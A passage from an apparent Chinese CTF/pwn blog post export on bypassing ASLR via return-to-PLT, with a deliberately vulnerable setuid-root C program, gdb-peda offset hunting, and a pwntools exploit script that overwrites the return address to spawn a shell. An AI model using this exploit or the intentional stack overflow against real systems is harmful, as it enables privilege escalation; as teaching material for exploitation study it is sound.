buf, 500);\n   \tprintf(\"%s\\n\",buf);\n   \treturn 0;\n   }\n   ```\n\n2. 编译命令\n\n   ```shell\n   #echo 2 > /proc/sys/kernel/randomize_va_space\n   $gcc -g -fno-stack-protector -no-pie -o vuln vuln.c\n   $sudo chown root vuln\n   $sudo chgrp root vuln\n   $sudo chmod +s vuln\n   ```\n\n<!-- more -->\n\n## 调试代码\n\n```\ngdb-peda$ i func\nAll defined functions:\n\nNon-debugging symbols:\n0x0000000000400470  _init\n0x00000000004004a0  puts@plt\n0x00000000004004b0  system@plt\n0x00000000004004c0  read@plt\n0x00000000004004d0  exit@plt\n0x00000000004004e0  _start\n0x0000000000400510  _dl_relocate_static_pie\n0x0000000000400520  deregister_tm_clones\n0x0000000000400550  register_tm_clones\n0x0000000000400590  __do_global_dtors_aux\n0x00000000004005c0  frame_dummy\n0x00000000004005c7  shell\n0x00000000004005e6  main\n0x0000000000400640  __libc_csu_init\n0x00000000004006b0  __libc_csu_fini\n0x00000000004006b4  _fini\n```\n\n首先，我们找到shell函数的地址`0x00000000004005c7`\n\n再找到ret地址的偏移:\n\n```\ngdb-peda$ pattern_create 300\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln \nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x0 \nRBX: 0x0 \nRCX: 0x7ffff7af4154 (<__GI___libc_write+20>:\tcmp    rax,0xfffffffffffff000)\nRDX: 0x7ffff7dd18c0 --> 0x0 \nRSI: 0x602260 --> 0x4173414125410a7f \nRDI: 0x1 \nRBP: 0x3425416525414925 ('%IA%eA%4')\nRSP: 0x7fffffffdd98 (\"A%JA%fA%5A%KA%gA%6A%\\n\\177\")\nRIP: 0x400638 (<main+82>:\tret)\nR8 : 0x0 \nR9 : 0x0 \nR10: 0x602010 --> 0x0 \nR11: 0x246 \nR12: 0x4004e0 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffde70 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x40062d <main+71>:\tcall   0x4004a0 <puts@plt>\n   0x400632 <main+76>:\tmov    eax,0x0\n   0x400637 <main+81>:\tleave  \n=> 0x400638 <main+82>:\tret    \n   0x400639:\tnop    DWORD PTR [rax+0x0]\n   0x400640 <__libc_csu_init>:\tpush   r15\n   0x400642 <__libc_csu_init+2>:\tpush   r14\n   0x400644 <__libc_csu_init+4>:\tmov    r15,rdx\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd98 (\"A%JA%fA%5A%KA%gA%6A%\\n\\177\")\n0008| 0x7fffffffdda0 (\"5A%KA%gA%6A%\\n\\177\")\n0016| 0x7fffffffdda8 --> 0x7f0a25413625 \n0024| 0x7fffffffddb0 --> 0x100008000 \n0032| 0x7fffffffddb8 --> 0x4005e6 (<main>:\tpush   rbp)\n0040| 0x7fffffffddc0 --> 0x0 \n0048| 0x7fffffffddc8 --> 0xd10c02d6c0ba1de5 \n0056| 0x7fffffffddd0 --> 0x4004e0 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0000000000400638 in main ()\ngdb-peda$ pattern_offset A%JA%fA%5A%KA%gA%6A%\\n\\177\nA%JA%fA%5A%KA%gA%6A% found at offset: 280\n```\n\n现在构造payload如下:\n\n> 'A' * 280 + shell_addr\n\n测试一下:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ python -c \"print 'A' * 280 + '\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'\" > temp\n```\n\n我们发现，并没有给我们shell。\n\n```\ntianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...(no debugging symbols found)...done.\ngdb-peda$ r < temp\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln < temp\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@\n[New process 87894]\n\nThread 2.1 \"vuln\" received signal SIGSEGV, Segmentation fault.\n[Switching to process 87894]\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')\nRBX: 0x0 \nRCX: 0x7ffff7b97e9f --> 0x2074697865006873 ('sh')\nRDX: 0x0 \nRSI: 0x7ffff7dd16a0 --> 0x0 \nRDI: 0x2 \nRBP: 0x7fffffffdc58 --> 0x0 \nRSP: 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 \nRIP: 0x7ffff7a332f6 (<do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0)\nR8 : 0x7ffff7dd1600 --> 0x0 \nR9 : 0x0 \nR10: 0x8 \nR11: 0x246 \nR12: 0x4006c4 --> 0x68732f6e69622f ('/bin/sh')\nR13: 0x7fffffffde70 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff7a332e6 <do_system+1078>:\tmovq   xmm0,QWORD PTR [rsp+0x8]\n   0x7ffff7a332ec <do_system+1084>:\tmov    QWORD PTR [rsp+0x8],rax\n   0x7ffff7a332f1 <do_system+1089>:\tmovhps xmm0,QWORD PTR [rsp+0x8]\n=> 0x7ffff7a332f6 <do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0\n   0x7ffff7a332fb <do_system+1099>:\tcall   0x7ffff7a23110 <__GI___sigaction>\n   0x7ffff7a33300 <do_system+1104>:\tlea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 <quit>\n   0x7ffff7a33307 <do_system+1111>:\txor    edx,edx\n   0x7ffff7a33309 <do_system+1113>:\tmov    edi,0x3\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 \n0008| 0x7fffffffdc00 --> 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')\n0016| 0x7fffffffdc08 --> 0x0 \n0024| 0x7fffffffdc10 --> 0x0 \n0032| 0x7fffffffdc18 --> 0x7ffff7a33360 (<cancel_handler>:\tpush   rbx)\n0040| 0x7fffffffdc20 --> 0x7fffffffdc14 --> 0xf7a3336000000000 \n0048| 0x7fffffffdc28 --> 0x0 \n0056| 0x7fffffffdc30 --> 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00007ffff7a332f6 in do_system (line=0x4006c4 \"/bin/sh\") at ../sysdeps/posix/system.c:125\n125\t../sysdeps/posix/system.c: No such file or directory.\n```\n\n卡在这个地方:\n\n```\n0x7ffff7a332f6 <do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0\n```\n\n这是因为movaps需要我们的rsp地址对齐到16字节。\n\n当前rsp的值:\n\n```\nRSP: 0x7fffffffdbf8\n```\n\n知道原因后，我们可以重新构造如下payload:\n\n> 'A' * 280 + ret_addr + shell_addr\n\n脚本如下:\n\n```python\nfrom pwn import *\n\n# 'A' * 280 + ret_addr + shell_addr\npayload = 'A' * 280 + '\\x38\\x06\\x40\\x00\\x00\\x00\\x00\\x00' + '\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'\n\nio = process(\"./vuln\")\nio.sendline(payload)\nio.interactive()\n```\n\n\n\n","source":"_posts/bypassaslr-1.md","raw":"---\ntitle: bypassaslr_1\ndate: 2018-05-21 16:30:00\ntags: \n- pwn\n---\n\n# 绕过ASLR--return2plt\n\n## 编译代码\n\n1. 源代码\n\n   ```c\n   #include<stdio.h>\n   #include <string.h>\n   /* Eventhough shell() function isnt invoked directly, its needed\n      here since 'system@PLT' and 'exit@PLT' stub code should be pres\n      ent in executable to successfully exploit it. */\n   void shell() {\n   \tsystem(\"/bin/sh\");\n   \texit(0);\n   }\n   int main(int argc, char* argv[]) {\n   \tint i=0;\n   \tchar buf[256];\n   \tread(0, buf, 500);\n   \tprintf(\"%s\\n\",buf);\n   \treturn 0;\n   }\n   ```\n\n2. 编译命令\n\n   ```shell\n   #echo 2 > /proc/sys/kernel/randomize_va_space\n   $gcc -g -fno-stack-protector -no-pie -o vuln vuln.c\n   $sudo chown root vuln\n   $sudo chgrp root vuln\n   $sudo chmod +s vuln\n   ```\n\n<!-- more -->\n\n## 调试代码\n\n```\ngdb-peda$ i func\nAll defined functions:\n\nNon-debugging symbols:\n0x0000000000400470  _init\n0x00000000004004a0  puts@plt\n0x00000000004004b0  system@plt\n0x00000000004004c0  read@plt\n0x00000000004004d0  exit@plt\n0x00000000004004e0  _start\n0x0000000000400510  _dl_relocate_static_pie\n0x0000000000400520  deregister_tm_clones\n0x0000000000400550  register_tm_clones\n0x0000000000400590  __do_global_dtors_aux\n0x00000000004005c0  frame_dummy\n0x00000000004005c7  shell\n0x00000000004005e6  main\n0x0000000000400640  __libc_csu_init\n0x00000000004006b0  __libc_csu_fini\n0x00000000004006b4  _fini\n```\n\n首先，我们找到shell函数的地址`0x00000000004005c7`\n\n再找到ret地址的偏移:\n\n```\ngdb-peda$ pattern_create 300\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln \nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x0 \nRBX: 0x0 \nRCX: 0x7ffff7af4154 (<__GI___libc_write+20>:\tcmp    rax,0xfffffffffffff000)\nRDX: 0x7ffff7dd18c0 --> 0x0 \nRSI: 0x602260 --> 0x4173414125410a7f \nRDI: 0x1 \nRBP: 0x3425416525414925 ('%IA%eA%4')\nRSP: 0x7fffffffdd98 (\"A%JA%fA%5A%KA%gA%6A%\\n\\177\")\nRIP: 0x400638 (<main+82>:\tret)\nR8 : 0x0 \nR9 : 0x0 \nR10: 0x602010 --> 0x0 \nR11: 0x246 \nR12: 0x4004e0 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffde70 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x40062d <main+71>:\tcall   0x4004a0 <puts@plt>\n   0x400632 <main+76>:\tmov    eax,0x0\n   0x400637 <main+81>:\tleave  \n=> 0x400638 <main+82>:\tret    \n   0x400639:\tnop    DWORD PTR [rax+0x0]\n   0x400640 <__libc_csu_init>:\tpush   r15\n   0x400642 <__libc_csu_init+2>:\tpush   r14\n   0x400644 <__libc_csu_init+4>:\tmov    r15,rdx\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd98 (\"A%JA%fA%5A%KA%gA%6A%\\n\\177\")\n0008| 0x7fffffffdda0 (\"5A%KA%gA%6A%\\n\\177\")\n0016| 0x7fffffffdda8 --> 0x7f0a25413625 \n0024| 0x7fffffffddb0 --> 0x100008000 \n0032| 0x7fffffffddb8 --> 0x4005e6 (<main>:\tpush   rbp)\n0040| 0x7fffffffddc0 --> 0x0 \n0048| 0x7fffffffddc8 --> 0xd10c02d6c0ba1de5 \n0056| 0x7fffffffddd0 --> 0x4004e0 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0000000000400638 in main ()\ngdb-peda$ pattern_offset A%JA%fA%5A%KA%gA%6A%\\n\\177\nA%JA%fA%5A%KA%gA%6A% found at offset: 280\n```\n\n现在构造payload如下:\n\n> 'A' * 280 + shell_addr\n\n测试一下:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ python -c \"print 'A' * 280 + '\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'\" > temp\n```\n\n我们发现，并没有给我们shell。\n\n```\ntianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...(no debugging symbols found)...done.\ngdb-peda$ r < temp\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln < temp\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@\n[New process 87894]\n\nThread 2.1 \"vuln\" received signal SIGSEGV, Segmentation fault.\n[Switching to process 87894]\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')\nRBX: 0x0 \nRCX: 0x7ffff7b97e9f --> 0x2074697865006873 ('sh')\nRDX: 0x0 \nRSI: 0x7ffff7dd16a0 --> 0x0 \nRDI: 0x2 \nRBP: 0x7fffffffdc58 --> 0x0 \nRSP: 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 \nRIP: 0x7ffff7a332f6 (<do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0)\nR8 : 0x7ffff7dd1600 --> 0x0 \nR9 : 0x0 \nR10: 0x8 \nR11: 0x246 \nR12: 0x4006c4 --> 0x68732f6e69622f ('/bin/sh')\nR13: 0x7fffffffde70 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff7a332e6 <do_system+1078>:\tmovq   xmm0,QWORD PTR [rsp+0x8]\n   0x7ffff7a332ec <do_system+1084>:\tmov    QWORD PTR [rsp+0x8],rax\n   0x7ffff7a332f1 <do_system+1089>:\tmovhps xmm0,QWORD PTR [rsp+0x8]\n=> 0x7ffff7a332f6 <do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0\n   0x7ffff7a332fb <do_system+1099>:\tcall   0x7ffff7a23110 <__GI___sigaction>\n   0x7ffff7a33300 <do_system+1104>:\tlea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 <quit>\n   0x7ffff7a33307 <do_system+1111>:\txor    edx,edx\n   0x7ffff7a33309 <do_system+1113>:\tmov    edi,0x3\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdbf8 --> 0x7fffffffdc80 --> 0x0 \n0008| 0x7fffffffdc00 --> 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')\n0016| 0x7fffffffdc08 --> 0x0 \n0024| 0x7fffffffdc10 --> 0x0 \n0032| 0x7fffffffdc18 --> 0x7ffff7a33360 (<cancel_handler>:\tpush   rbx)\n0040| 0x7fffffffdc20 --> 0x7fffffffdc14 --> 0xf7a3336000000000 \n0048| 0x7fffffffdc28 --> 0x0 \n0056| 0x7fffffffdc30 --> 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00007ffff7a332f6 in do_system (line=0x4006c4 \"/bin/sh\") at ../sysdeps/posix/system.c:125\n125\t../sysdeps/posix/system.c: No such file or directory.\n```\n\n卡在这个地方:\n\n```\n0x7ffff7a332f6 <do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0\n```\n\n这是因为movaps需要我们的rsp地址对齐到16字节。\n\n当前rsp的值:\n\n```\nRSP: 0x7fffffffdbf8\n```\n\n知道原因后，我们可以重新构造如下payload:\n\n> 'A' * 280 + ret_addr + shell_addr\n\n脚本如下:\n\n```python\nfrom pwn import *\n\n# 'A' * 280 + ret_addr + shell_addr\npayload = 'A' * 280 + '\\x38\\x06\\x40\\x00\\x00\\x00\\x00\\x00' + '\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'\n\nio = process(\"./vuln\")\nio.sendline(payload)\nio.interactive()\n```\n\n\n\n","slug":"bypassaslr-1","published":1,"updated":"2018-06-30T02:04:04.874Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12ga0001qkdlepvt8neg","content":"<h1 id=\"绕过ASLR–return2plt\"><a href=\"#绕过ASLR–return2plt\" class=\"headerlink\" title=\"绕过ASLR–return2plt\"></a>绕过ASLR–return2plt</h1><h2 id=\"编译代码\"><a href=\"#编译代码\" class=\"headerlink\" title=\"编译代码\"></a>编译代码</h2><ol>\n<li><p>源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">/* Eventhough shell() function isnt invoked directly, its needed</span></span><br><span class=\"line\"><span class=\"comment\">   here since 'system@PLT' and 'exit@PLT' stub code should be pres</span></span><br><span class=\"line\"><span class=\"comment\">   ent in executable to successfully exploit it. */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">shell</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\tsystem(<span class=\"string\">\"/bin/sh\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> buf[<span class=\"number\">256</span>];</span><br><span class=\"line\">\tread(<span class=\"number\">0</span>, buf, <span class=\"number\">500</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,buf);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编译命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span>echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class=\"line\"><span class=\"meta\">$</span>gcc -g -fno-stack-protector -no-pie -o vuln vuln.c</span><br><span class=\"line\"><span class=\"meta\">$</span>sudo chown root vuln</span><br><span class=\"line\"><span class=\"meta\">$</span>sudo chgrp root vuln</span><br><span class=\"line\"><span class=\"meta\">$</span>sudo chmod +s vuln</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<a id=\"more\"></a>\n<h2 id=\"调试代码\"><a href=\"#调试代码\" class=\"headerlink\" title=\"调试代码\"></a>调试代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ i func</span><br><span class=\"line\">All defined functions:</span><br><span class=\"line\"></span><br><span class=\"line\">Non-debugging symbols:</span><br><span class=\"line\">0x0000000000400470  _init</span><br><span class=\"line\">0x00000000004004a0  puts@plt</span><br><span class=\"line\">0x00000000004004b0  system@plt</span><br><span class=\"line\">0x00000000004004c0  read@plt</span><br><span class=\"line\">0x00000000004004d0  exit@plt</span><br><span class=\"line\">0x00000000004004e0  _start</span><br><span class=\"line\">0x0000000000400510  _dl_relocate_static_pie</span><br><span class=\"line\">0x0000000000400520  deregister_tm_clones</span><br><span class=\"line\">0x0000000000400550  register_tm_clones</span><br><span class=\"line\">0x0000000000400590  __do_global_dtors_aux</span><br><span class=\"line\">0x00000000004005c0  frame_dummy</span><br><span class=\"line\">0x00000000004005c7  shell</span><br><span class=\"line\">0x00000000004005e6  main</span><br><span class=\"line\">0x0000000000400640  __libc_csu_init</span><br><span class=\"line\">0x00000000004006b0  __libc_csu_fini</span><br><span class=\"line\">0x00000000004006b4  _fini</span><br></pre></td></tr></table></figure>\n<p>首先，我们找到shell函数的地址<code>0x00000000004005c7</code></p>\n<p>再找到ret地址的偏移:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ pattern_create 300</span><br><span class=\"line\">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%&apos;</span><br><span class=\"line\">gdb-peda$ r</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln </span><br><span class=\"line\">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%</span><br><span class=\"line\">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Program received signal SIGSEGV, Segmentation fault.</span><br><span class=\"line\"></span><br><span class=\"line\">[----------------------------------registers-----------------------------------]</span><br><span class=\"line\">RAX: 0x0 </span><br><span class=\"line\">RBX: 0x0 </span><br><span class=\"line\">RCX: 0x7ffff7af4154 (&lt;__GI___libc_write+20&gt;:\tcmp    rax,0xfffffffffffff000)</span><br><span class=\"line\">RDX: 0x7ffff7dd18c0 --&gt; 0x0 